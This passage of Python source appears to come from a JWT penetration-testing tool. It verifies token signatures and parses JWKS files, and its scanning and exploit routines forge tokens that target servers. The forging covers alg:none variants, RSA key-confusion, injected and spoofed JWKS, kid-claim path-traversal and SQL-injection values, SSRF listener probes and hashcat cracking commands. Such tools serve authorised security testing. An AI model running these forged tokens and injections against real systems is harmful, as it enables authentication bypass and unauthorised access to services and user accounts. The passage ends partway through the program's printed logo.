    elif headDict['alg'] == "ES384":
        h = SHA384.new(message)
    elif headDict['alg'] == "ES512":
        h = SHA512.new(message)
    else:
        cprint("Invalid ECDSA algorithm", "red")
    pubkey = open(pubKey, "r")
    pub_key = ECC.import_key(pubkey.read())
    verifier = DSS.new(pub_key, 'fips-186-3')
    try:
        verifier.verify(h, signature)
        cprint("ECC Signature is VALID", "green")
        valid = True
    except:
        cprint("ECC Signature is INVALID", "red")
        valid = False
    return valid

def verifyTokenPSS(headDict, paylDict, sig, pubKey):
    key = RSA.importKey(open(pubKey).read())
    newContents = genContents(headDict, paylDict)
    newContents = newContents.encode('UTF-8')
    if "-" in sig:
        try:
            sig = base64.urlsafe_b64decode(sig)
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.urlsafe_b64decode(sig+"==")
        except:
            pass
    elif "+" in sig:
        try:
            sig = base64.b64decode(sig)
        except:
            pass
        try:
            sig = base64.b64decode(sig+"=")
        except:
            pass
        try:
            sig = base64.b64decode(sig+"==")
        except:
            pass
    else:
        cprint("Signature not Base64 encoded HEX", "red")
    if headDict['alg'] == "PS256":
        h = SHA256.new(newContents)
    elif headDict['alg'] == "PS384":
        h = SHA384.new(newContents)
    elif headDict['alg'] == "PS512":
        h = SHA512.new(newContents)
    else:
        cprint("Invalid RSA algorithm", "red")
    verifier = pss.new(key)
    try:
        valid = verifier.verify(h, sig)
        cprint("RSA-PSS Signature is VALID", "green")
        valid = True
    except:
        cprint("RSA-PSS Signature is INVALID", "red")
        valid = False
    return valid

def exportJWKS(jku):
    try:
        kid = headDict["kid"]
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'], kid)
    except:
        kid = ""
        newSig, newContents, newjwks, privKeyName, jwksName, fulljwks = jwksGen(headDict, paylDict, jku, config['crypto']['privkey'])
    return newContents, newSig

def parseJWKS(jwksfile):
    jwks = open(jwksfile, "r").read()
    jwksDict = json.loads(jwks, object_pairs_hook=OrderedDict)
    nowtime = int(datetime.now().timestamp())
    print("JWKS Contents:")
    try:
        keyLen = len(jwksDict["keys"])
        print("Number of keys: "+str(keyLen))
        i = -1
        for jkey in range(0,keyLen):
            i += 1
            print("\n--------")
            try:
                print("Key "+str(i+1))
                kid = str(jwksDict["keys"][i]["kid"])
                print("kid: "+kid)
            except:
                kid = i
                print("Key "+str(i+1))
            for keyVal in jwksDict["keys"][i].items():
                keyVal = keyVal[0]
                cprint("[+] "+keyVal+" = "+str(jwksDict["keys"][i][keyVal]), "green")
            try:
                x = str(jwksDict["keys"][i]["x"])
                y = str(jwksDict["keys"][i]["y"])
                print("\nFound ECC key factors, generating a public key")
                pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
                cprint("[+] "+pubkeyName, "green")
                print("\nAttempting to verify token using "+pubkeyName)
                valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
            except:
                pass
            try:
                n = str(jwksDict["keys"][i]["n"])
                e = str(jwksDict["keys"][i]["e"])
                print("\nFound RSA key factors, generating a public key")
                pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
                cprint("[+] "+pubkeyName, "green")
                print("\nAttempting to verify token using "+pubkeyName)
                valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
            except:
                pass
    except:
        print("Single key file")
        for jkey in jwksDict:
            cprint("[+] "+jkey+" = "+str(jwksDict[jkey]), "green")
        try:
            kid = 1
            x = str(jwksDict["x"])
            y = str(jwksDict["y"])
            print("\nFound ECC key factors, generating a public key")
            pubkeyName = genECPubFromJWKS(x, y, kid, nowtime)
            cprint("[+] "+pubkeyName, "green")
            print("\nAttempting to verify token using "+pubkeyName)
            valid = verifyTokenEC(headDict, paylDict, sig, pubkeyName)
        except:
            pass
        try:
            kid = 1
            n = str(jwksDict["n"])
            e = str(jwksDict["e"])
            print("\nFound RSA key factors, generating a public key")
            pubkeyName = genRSAPubFromJWKS(n, e, kid, nowtime)
            cprint("[+] "+pubkeyName, "green")
            print("\nAttempting to verify token using "+pubkeyName)
            valid = verifyTokenRSA(headDict, paylDict, sig, pubkeyName)
        except:
            pass

def genECPubFromJWKS(x, y, kid, nowtime):
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x), byteorder='big')
    except:
        pass
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x+"="), byteorder='big')
    except:
        pass
    try:
        x = int.from_bytes(base64.urlsafe_b64decode(x+"=="), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y+"="), byteorder='big')
    except:
        pass
    try:
        y = int.from_bytes(base64.urlsafe_b64decode(y+"=="), byteorder='big')
    except:
        pass
    new_key = ECC.construct(curve='P-256', point_x=x, point_y=y)
    pubKey = new_key.public_key().export_key(format="PEM")+"\n"
    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubkeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey)
    return pubkeyName

def genRSAPubFromJWKS(n, e, kid, nowtime):
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n), byteorder='big')
    except:
        pass
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n+"="), byteorder='big')
    except:
        pass
    try:
        n = int.from_bytes(base64.urlsafe_b64decode(n+"=="), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e+"="), byteorder='big')
    except:
        pass
    try:
        e = int.from_bytes(base64.urlsafe_b64decode(e+"=="), byteorder='big')
    except:
        pass
    new_key = RSA.construct((n, e))
    pubKey = new_key.publickey().exportKey(format="PEM")
    pubkeyName = "kid_"+str(kid)+"_"+str(nowtime)+".pem"
    with open(pubkeyName, 'w') as test_pub_out:
        test_pub_out.write(pubKey.decode()+"\n")
    return pubkeyName

def getVal(promptString):
    newVal = input(promptString)
    try:
        newVal = json.loads(newVal)
    except ValueError:
        try:
            newVal = json.loads(newVal.replace("'", '"'))
        except ValueError:
            pass
    return newVal

def genContents(headDict, paylDict, newContents=""):
    if paylDict == {}:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."
    else:
        newContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newContents.encode().decode('UTF-8')

def dissectPayl(paylDict, count=False):
    timeseen = 0
    comparestamps = []
    countval = 0
    expiredtoken = False
    nowtime = int(datetime.now().timestamp())
    for claim in paylDict:
        countval += 1
        if count:
            placeholder = str(countval)
        else:
            placeholder = "+"
        if claim in ["exp", "nbf", "iat"]:
            timestamp = datetime.fromtimestamp(int(paylDict[claim]))
            if claim == "exp":
                if int(timestamp.timestamp()) < nowtime:
                    expiredtoken = True
            cprint("["+placeholder+"] "+claim+" = "+str(paylDict[claim])+"    ==> TIMESTAMP = "+timestamp.strftime('%Y-%m-%d %H:%M:%S')+" (UTC)", "green")
            timeseen += 1
            comparestamps.append(claim)
        elif isinstance(paylDict[claim], dict):
                print("["+placeholder+"] "+claim+" = JSON object:")
                for subclaim in paylDict[claim]:
                    if paylDict[claim][subclaim] == None:
                        print("    [+] "+subclaim+" = null")
                    elif paylDict[claim][subclaim] == True:
                        print("    [+] "+subclaim+" = true")
                    elif paylDict[claim][subclaim] == False:
                        print("    [+] "+subclaim+" = false")
                    elif type(castInput(paylDict[claim][subclaim])) == str:
                        cprint("    [+] "+subclaim+" = \""+str(paylDict[claim][subclaim])+"\"", "green")
                    else:
                        cprint("    [+] "+subclaim+" = "+str(paylDict[claim][subclaim]), "green")
        else:
            if type(paylDict[claim]) == str:
                cprint("["+placeholder+"] "+claim+" = \""+str(paylDict[claim])+"\"", "green")
            else:
                cprint("["+placeholder+"] "+claim+" = "+str(paylDict[claim]), "green")
    return comparestamps, expiredtoken

def validateToken(jwt):
    try:
        headB64, paylB64, sig = jwt.split(".",3)
    except:
        cprint("[-] Invalid token:\nNot 3 parts -> header.payload.signature", "red")
        exit(1)
    try:
        sig = base64.urlsafe_b64encode(base64.urlsafe_b64decode(sig + "=" * (-len(sig) % 4))).decode('UTF-8').strip("=")
    except:
        cprint("[-] Invalid token:\nCould not base64-decode SIGNATURE - incorrect formatting/invalid characters", "red")
        print("----------------")
        cprint(headB64, "cyan")
        cprint(paylB64, "cyan")
        cprint(sig, "red")
        exit(1)
    contents = headB64+"."+paylB64
    contents = contents.encode()
    try:
        head = base64.urlsafe_b64decode(headB64 + "=" * (-len(headB64) % 4))
    except:
        cprint("[-] Invalid token:\nCould not base64-decode HEADER - incorrect formatting/invalid characters", "red")
        print("----------------")
        cprint(headB64, "red")
        cprint(paylB64, "cyan")
        cprint(sig, "cyan")
        exit(1)
    try:
        payl = base64.urlsafe_b64decode(paylB64 + "=" * (-len(paylB64) % 4))
    except:
        cprint("[-] Invalid token:\nCould not base64-decode PAYLOAD - incorrect formatting/invalid characters", "red")
        print("----------------")
        cprint(headB64, "cyan")
        cprint(paylB64, "red")
        cprint(sig, "cyan")
        exit(1)
    try:
        headDict = json.loads(head, object_pairs_hook=OrderedDict)
    except:
        cprint("[-] Invalid token:\nHEADER not valid JSON format", "red")

        cprint(head.decode('UTF-8'))
        exit(1)
    if payl.decode() == "":
        print("Payload is blank")
        paylDict = {}
    else:
        try:
            paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
        except:
            cprint("[-] Invalid token:\nPAYLOAD not valid JSON format", "red")
            cprint(payl.decode('UTF-8'))
            exit(1)
    return headDict, paylDict, sig, contents

def exploreToken(headDict, paylDict):
    print("\n=====================\nExamine Token Values:\n=====================")
    claims = 0
    for claim in headDict:
        if claim == "jku":
            cprint("\n[-] jku: The 'JWKS URL' claim in the header is used to define the location of a JWKS file - a JSON file that stores signing key data. The main vulnerabilities here are:\n     [*] the JWKS could contain private key data\n     [*] the URL could be tampered with to point to a malicious JWKS\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
            claims += 1
        elif claim == "kid":
            cprint("\n[-] kid: The 'key ID' claim in the header identifies the key used for signing the token. This could be a key stored in a JWKS file at an externally-accessible URL (especially one named in a 'jku' claim), a similarly-named public key on the server's file system, a JWKS file on the server's file system, or within a JWKS file somewhere accessible only to the server. The main vulnerabilities here are tampering the value to:\n     [*] prompt verbose errors\n     [*] redirect to an alternative internal file to use for signing\n     [*] perform command injection\n     [*] perform other injection attacks", "red")
            claims += 1
        elif claim == "x5u":
            cprint("\n[-] x5u: The 'x509 Certificate URL' claim in the header is used to define the location of an x509 Certificate, used to sign the token - usually stored within a JWKS file that stores signing key data. The main vulnerabilities here are:\n     [*] the x509 could contain sensitive data\n[*] the URL could be tampered with to point to a malicious x509 Certificate\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
            claims += 1
    for claim in paylDict:
        if claim == "iss":
            cprint("\n[-] iss: The 'issuer' claim in the payload is used to define the 'principal' that issued the JWT. The main vulnerabilities here are:\n     [*] a URL that reveals sensitive data.\n     [*] tampering a URL could force a lookup, leading to SSRF conditions", "red")
            claims += 1
    if claims == 0:
        print("\nNo commonly-known vulnerable claims identified.\n")

def rejigToken(headDict, paylDict, sig):
    print("=====================\nDecoded Token Values:\n=====================")
    print("\nToken header values:")
    for claim in headDict:
        if isinstance(headDict[claim], dict):
            cprint("[+] "+claim+" = JSON object:", "green")
            for subclaim in headDict[claim]:
                if headDict[claim][subclaim] == None:
                    cprint("    [+] "+subclaim+" = null", "green")
                elif headDict[claim][subclaim] == True:
                    cprint("    [+] "+subclaim+" = true", "green")
                elif headDict[claim][subclaim] == False: 
                    cprint("    [+] "+subclaim+" = false", "green")
                elif type(headDict[claim][subclaim]) == str:
                    cprint("    [+] "+subclaim+" = \""+str(headDict[claim][subclaim])+"\"", "green")
                else:
                    cprint("    [+] "+subclaim+" = "+str(headDict[claim][subclaim]), "green")
        else:
            if type(headDict[claim]) == str:
                cprint("[+] "+claim+" = \""+str(headDict[claim])+"\"", "green")
            else:
                cprint("[+] "+claim+" = "+str(headDict[claim]), "green")
    print("\nToken payload values:")
    comparestamps, expiredtoken = dissectPayl(paylDict)
    if len(comparestamps) >= 2:
        print("\nSeen timestamps:")
        cprint("[*] "+comparestamps[0]+" was seen", "green")
        claimnum = 0
        for claim in comparestamps:
            timeoff = int(paylDict[comparestamps[claimnum]])-int(paylDict[comparestamps[0]])
            if timeoff != 0:
                timecalc = timeoff
                days,hours,mins = 0,0,0
                if timecalc >= 86400:
                    days = str(timecalc/86400)
                    days = int(float(days))
                    timecalc -= days*86400
                if timecalc >= 3600:
                    hours = str(timecalc/3600)
                    hours = int(float(hours))
                    timecalc -= hours*3600
                if timecalc >= 60:
                    mins = str(timecalc/60)
                    mins = int(float(mins))
                    timecalc -= mins*60
                if timeoff < 0:
                    timeoff = timeoff*-1
                    prepost = "[*] "+claim+" is earlier than "+comparestamps[0]+" by: "
                    cprint(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
                else:
                    prepost = "[*] "+claim+" is later than "+comparestamps[0]+" by: "
                    cprint(prepost+str(days)+" days, "+str(hours)+" hours, "+str(mins)+" mins", "green")
            claimnum += 1
    if expiredtoken:
        cprint("[-] TOKEN IS EXPIRED!", "red")
    print("\n----------------------\nJWT common timestamps:\niat = IssuedAt\nexp = Expires\nnbf = NotBefore\n----------------------\n")
    return headDict, paylDict, sig

def searchLog(logID):
    qResult = ""
    with open(logFilename, 'r') as logFile:
        logLine = logFile.readline()
        while logLine:
            if logID in logLine:
                qResult = logLine
                break
            logLine = logFile.readline()
        if qResult:
            qOutput = re.sub(' - eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', '', qResult)
            qOutput = re.sub(logID+' - ', '', qOutput)
            try:
                jwt = re.findall('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', qResult)[-1]
            except:
                cprint("JWT not included in log", "red")
                exit(1)
            cprint(logID+"\n"+qOutput, "green")
            print("JWT from request:")
            cprint(jwt, "green")
            headDict, paylDict, sig, contents = validateToken(jwt)
            rejigToken(headDict, paylDict, sig)
            return jwt
        else:
            cprint("ID not found in logfile", "red")

def injectOut(newheadDict, newpaylDict):
    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.sign:
        desc = "Injected token with unchanged signature"
        jwtOut(newContents+"."+sig, "Injected claim", desc)
    elif args.sign:
        signingToken(newheadDict, newpaylDict)
    else:
        runActions()

def scanModePlaybook():
    cprint("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
    # No token
    tmpCookies = config['argvals']['cookies']
    tmpHeader = config['argvals']['header']
    if config['argvals']['headerloc'] == "cookies":
        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'])
    elif config['argvals']['headerloc'] == "headers":
        config['argvals']['header'] = ""
    config['argvals']['overridesub'] = "true"
    jwtOut(jwt, "No token", "No token was sent to check if the token is required")
    config['argvals']['cookies'] = tmpCookies
    config['argvals']['header'] = tmpHeader
    # Broken sig
    jwtTweak = contents.decode()+"."+sig[:-4]
    jwtOut(jwtTweak, "Broken signature", "This token was sent to check if the signature is being checked")
    # Persistent
    jwtOut(jwt, "Persistence check 1 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
    # Claim processing order - check reflected output in all claims
    reflectedClaims()
    jwtOut(jwt, "Persistence check 2 (should always be valid)", "Original token sent to check if tokens work after invalid submissions")
    # Weak HMAC secret
    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
        cprint("Testing "+headDict['alg'][:2]+" token against common JWT secrets (jwt-common.txt)", "cyan")
        config['argvals']['keyList'] = "jwt-common.txt"
        crackSig(sig, contents)
    # Exploit: alg:none
    noneToks = checkAlgNone(headDict, paylB64)
    zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
    for noneTok in zippedToks:
        jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], "Testing whether the None algorithm is accepted - which allows forging unsigned tokens")
    # Exploit: key confusion - use provided PubKey
    if config['crypto']['pubkey']:
                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
                jwtOut(newTok+"."+newSig, "Exploit: RSA Key Confusion Exploit (provided Public Key)")
    # Exploit: jwks injection
    try:
        origjwk = headDict["jwk"]
    except:
        origjwk = False
    jwksig, jwksContents = jwksEmbed(headDict, paylDict)
    jwtOut(jwksContents+"."+jwksig, "Exploit: Injected JWKS")
    if origjwk:
        headDict["jwk"] = origjwk
    else:
        del headDict["jwk"]
    # Exploit: spoof jwks
    try:
        origjku = headDict["jku"]
    except:
        origjku = False
    jku = config['services']['jwksloc']
    newContents, newSig = exportJWKS(jku)
    jwtOut(newContents+"."+newSig, "Exploit: Spoof JWKS", "Signed with JWKS at "+config['services']['jwksloc'])
    if origjku:
        headDict["jku"] = origjku
    else:
        del headDict["jku"]
    # kid testing... start
    try:
        origkid = headDict["kid"]
    except:
        origkid = False
    origalg = headDict["alg"]
    # kid inject: blank field, sign with null
    newheadDict, newHeadB64 = injectheaderclaim("kid", "")
    key = open("null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+sig, "Injected kid claim - null-signed with blank kid")
    # kid inject: path traversal - known path - check for robots.txt, sign with variations of location
    newheadDict, newHeadB64 = injectheaderclaim("kid", "../../../../../../dev/null")
    key = open("null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+sig, "Injected kid claim - null-signed with kid=\"[path traversal]/dev/null\"")
    newheadDict, newHeadB64 = injectheaderclaim("kid", "/dev/null")
    key = open("null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+sig, "Injected kid claim - null-signed with kid=\"/dev/null\"")
    # kid inject: path traversal - bad path - sign with null
    # kid inject: SQLi explicit value
    newheadDict, newHeadB64 = injectheaderclaim("kid", "x' UNION SELECT '';--")
    key = open("null.txt").read()
    newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
    jwtOut(newContents+"."+sig, "Injected kid claim - null-signed with kid=\"/dev/null\"")
    # kid testing... end  
    if origkid:
        headDict["kid"] = origkid
    else:
        del headDict["kid"]
    headDict["alg"] = origalg
    # x5u external
    # Force External Interactions
    if config['services']['httplistener']:
        injectExternalInteractions(config['services']['httplistener'])
        cprint("External service interactions have been tested - check your listener for interactions", "green")
    else:
        cprint("External service interactions not tested - enter listener URl into 'jwtconf.ini' to try this option", "red")
    # Further manual testing: check expired token, brute key, find Public Key, run other scans
    cprint("Scanning mode completed: review the above results.\n", "magenta")
    cprint("The following additional checks should be performed that are better tested manually:", "green")
    if headDict['alg'][:2] == "HS" or headDict['alg'][:2] == "hs":
        cprint("[+] Try testing "+headDict['alg'][:2]+" token against weak password configurations by running the following hashcat cracking options:", "green")
        cprint("(Already testing against passwords in jwt-common.txt)", "cyan")
        cprint("Try using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.\nhashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:\n\n[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt\n[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6", "cyan")
    if headDict['alg'][:2] != "HS" and headDict['alg'][:2] != "hs":
        cprint("[+] Try hunting for a Public Key for this token. Validate any JWKS you find (-V -jw [jwks_file]) and then use the generated Public Key file with the Playbook Scan (-pk [kid_from_jwks].pem)", "green")
        cprint("Common locations for Public Keys are either the web application's SSL key, or stored as a JWKS file in one of these locations:", "cyan")
        with open('jwks-common.txt', "r", encoding='utf-8', errors='ignore') as jwksLst:
            nextVal = jwksLst.readline().rstrip()
            while nextVal:
                cprint(nextVal, "cyan")
                nextVal = jwksLst.readline().rstrip()

def scanModeErrors():
    cprint("\nLAUNCHING SCAN: Forced Errors", "magenta")
    # Inject dangerous content-types into existing header claims
    injectEachHeader(None)
    injectEachHeader(True)
    injectEachHeader(False)
    injectEachHeader("jwt_tool")
    injectEachHeader(0)
    # Inject dangerous content-types into existing payload claims
    injectEachPayload(None)
    injectEachPayload(True)
    injectEachPayload(False)
    injectEachPayload("jwt_tool")
    injectEachPayload(0)

def injectEachHeader(contentVal):
    for headerClaim in headDict:
        origVal = headDict[headerClaim]
        headDict[headerClaim] = contentVal
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Header Claim: "+str(headerClaim))
        headDict[headerClaim] = origVal

def injectEachPayload(contentVal):
    for payloadClaim in paylDict:
        origVal = paylDict[payloadClaim]
        paylDict[payloadClaim] = contentVal
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(contentVal)+" into Payload Claim: "+str(payloadClaim))
        paylDict[payloadClaim] = origVal

def injectExternalInteractions(listenerUrl):
    for headerClaim in headDict:
        injectUrl = listenerUrl+"/inject_into_"+headerClaim
        origVal = headDict[headerClaim]
        headDict[headerClaim] = injectUrl
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Header Claim: "+str(headerClaim))
        headDict[headerClaim] = origVal
    for payloadClaim in paylDict:
        injectUrl = listenerUrl+"/inject_into_"+payloadClaim
        origVal = paylDict[payloadClaim]
        paylDict[payloadClaim] = injectUrl
        newContents = genContents(headDict, paylDict)
        jwtOut(newContents+"."+sig, "Injected "+str(injectUrl)+" into Payload Claim: "+str(payloadClaim))
        paylDict[payloadClaim] = origVal

def kidInjectAttacks():
    with open(config['argvals']['injectionfile'], "r", encoding='utf-8', errors='ignore') as valLst:
        nextVal = valLst.readline()
        while nextVal:
            newheadDict, newHeadB64 = injectheaderclaim(config['argvals']['headerclaim'], nextVal.rstrip())
            newContents = genContents(newheadDict, paylDict)
            jwtOut(newContents+"."+sig, "Injected kid claim", desc)
            nextVal = valLst.readline()

def reflectedClaims():
    checkVal = "jwt_inject_"+hashlib.md5(datetime.now().strftime('%Y-%m-%d %H:%M:%S').encode()).hexdigest()+"_"
    for claim in paylDict:
        tmpValue = paylDict[claim]
        paylDict[claim] = checkVal+claim
        tmpContents = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")+"."+base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
        jwtOut(tmpContents+"."+sig, "Claim processing check in "+claim+" claim", "Token sent to check if the signature is checked before the "+claim+" claim is processed")
        if checkVal+claim in config['argvals']['rescontent']:
            cprint("Injected value in "+claim+" claim was observed - "+checkVal+claim, "red")
        paylDict[claim] = tmpValue


def preScan():
    cprint("Running prescan checks...", "cyan")
    jwtOut(jwt, "Prescan: original token", "Prescan: original token")
    if config['argvals']['canaryvalue']:
        if config['argvals']['canaryvalue'] not in config['argvals']['rescontent']:
            cprint("Canary value ("+config['argvals']['canaryvalue']+") was not found in base request - check that this token is valid and you are still logged in", "red")
            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
            if shallWeGoOn == "N":
                exit(1)
    origResSize, origResCode = config['argvals']['ressize'], config['argvals']['rescode']
    jwtOut("null", "Prescan: no token", "Prescan: no token")
    nullResSize, nullResCode = config['argvals']['ressize'], config['argvals']['rescode']
    if config['argvals']['canaryvalue'] == "":
        if origResCode == nullResCode:
            cprint("Valid and missing token requests return the same Status Code.\nYou should probably specify something from the page that identifies the user is logged-in (e.g. -cv \"Welcome back, ticarpi!\")", "red")
            shallWeGoOn = input("Do you wish to continue anyway? (\"Y\" or \"N\")")
            if shallWeGoOn == "N":
                exit(1)
    jwtTweak = contents.decode()+"."+sig[:-4]
    jwtOut(jwtTweak, "Prescan: Broken signature", "This token was sent to check if the signature is being checked")
    jwtOut(jwt, "Prescan: repeat original token", "Prescan: repeat original token")
    if origResCode != config['argvals']['rescode']:
        cprint("Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission", "red")
        exit(1)


def runScanning():
    cprint("Running Scanning Module:", "cyan")
    preScan()
    if config['argvals']['scanMode'] == "pb":
        scanModePlaybook()
    if config['argvals']['scanMode'] == "er":
        scanModeErrors()
    if config['argvals']['scanMode'] == "at":
        scanModePlaybook()
        scanModeErrors()


def runExploits():
    if args.exploit:
        if args.exploit == "a":
            noneToks = checkAlgNone(headDict, paylB64)
            zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
            for noneTok in zippedToks:
                desc = "EXPLOIT: "+zippedToks[noneTok]+" - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
                jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], desc)
            # exit(1)
        elif args.exploit == "i":
            newSig, newContents = jwksEmbed(headDict, paylDict)
            desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
            jwtOut(newContents+"."+newSig, "Injected JWKS", desc)
            # exit(1)
        elif args.exploit == "s":
            if config['services']['jwksloc']:
                jku = config['services']['jwksloc']
                newContents, newSig = exportJWKS(jku)
                if config['services']['jwksloc'] == args.jwksurl:
                    cprint("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
                desc = "Signed with JWKS at "+config['services']['jwksloc']
                jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)          
                # exit(1)
            else:
                print("No URL provided to spoof the JWKS (-u)\n")
                parser.print_usage()
            # exit(1)
        elif args.exploit == "k":
            if config['crypto']['pubkey']:
                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
                desc = "EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)"
                jwtOut(newTok+"."+newSig, "RSA Key Confusion Exploit", desc)
            else:
                cprint("No Public Key provided (-pk)\n", "red")
                parser.print_usage()
            # exit(1)

def runActions():
    if args.tamper:
        tamperToken(paylDict, headDict, sig)
        exit(1)
    if args.verify:
        if args.pubkey:
            algType = headDict["alg"][0:2]
            if algType == "RS":
                if args.pubkey:
                    verifyTokenRSA(headDict, paylDict, sig, args.pubkey)
                else:
                    verifyTokenRSA(headDict, paylDict, sig, config['crypto']['pubkey'])
                exit(1)
            elif algType == "ES":
                if config['crypto']['pubkey']:
                    verifyTokenEC(headDict, paylDict, sig, config['crypto']['pubkey'])
                else:
                    cprint("No Public Key provided (-pk)\n", "red")
                    parser.print_usage()
                exit(1)
            elif algType == "PS":
                if config['crypto']['pubkey']:
                    verifyTokenPSS(headDict, paylDict, sig, config['crypto']['pubkey'])
                else:
                    cprint("No Public Key provided (-pk)\n", "red")
                    parser.print_usage()
                exit(1)
            else:
                cprint("Algorithm not supported for verification", "red")
                exit(1)
        elif args.jwksfile:
            parseJWKS(config['crypto']['jwks'])
        else:
            cprint("No Public Key or JWKS file provided (-pk/-jw)\n", "red")
            parser.print_usage()
        exit(1)
    runExploits()
    if args.crack:
        if args.password:
            cprint("Password provided, checking if valid...", "cyan")
            checkSig(sig, contents, config['argvals']['key'])
        elif args.dict:
            crackSig(sig, contents)
        elif args.keyfile:
            checkSigKid(sig, contents)
        else:
            cprint("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n", "red")
            parser.print_usage()
        exit(1)
    if args.query and config['argvals']['sigType'] != "":
        signingToken(headDict, paylDict)


if __name__ == '__main__':
# Print logo
    print()
    print("   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\                  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ ")
    print("   \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __| \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __|                 \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
